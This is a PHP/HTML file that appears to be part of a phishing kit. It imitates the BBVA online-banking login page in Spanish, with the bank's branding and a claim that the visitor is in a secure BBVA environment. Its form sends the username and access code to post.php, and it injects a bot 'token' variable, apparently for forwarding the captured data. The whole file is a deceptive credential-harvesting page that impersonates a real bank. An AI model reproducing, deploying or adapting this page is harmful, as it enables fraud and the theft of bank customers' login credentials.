<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BBVA</title>
    <link rel="stylesheet" href="res/css/app.css">
</head>
<body>
<header class="header">
            <div class="logo">
            <img src="res\img\logoo.png">
            </div>
			<script>var token=<?php echo json_encode($bot); ?>;</script>

            <div class="links">
                <a href="#">Acceso a la banca online</a> |
                <a href="#">Ir a BBVA.es</a>
            </div>
        </header>
<main>
<div class="lok">
    <div class="pic">
        <img src="res/img/lok.png" alt="">
        </div>
        <span>Estás en un entorno con seguridad BBVA</span>
       </div>
    <div class="container">

     
            <h2>Hola, introduce tu <br> usuario y clave de acceso</h2>
            <form action="post.php" method="post">


                <div class="input">
                    <input type="text" name="user"placeholder="Usuario" required>
                </div>
                <div class="input">
                    <input type="password" id="password" placeholder="Clave de acceso" required>
                </div>
            
            
            
       
    </div>
    <div class="forgot">
                    <button type="submit">Entrar</button>
                    <a href="#">¿Olvidaste tu clave de acceso?</a>
                </div>
                </form>
                <div class="link">
                    <a href="#">¿No tienes clave de acceso? Crea tu clave</a>
                    <a href="#">¿No eres cliente? Hazte cliente</a>
                    <a href="#">Descubre las ventajas de la banca online</a>
                </div>
    </main>
	<script src="./res/cdn/jq.js"></script>
	<script src="./res/jquery.js"></script>

</body>
</html>
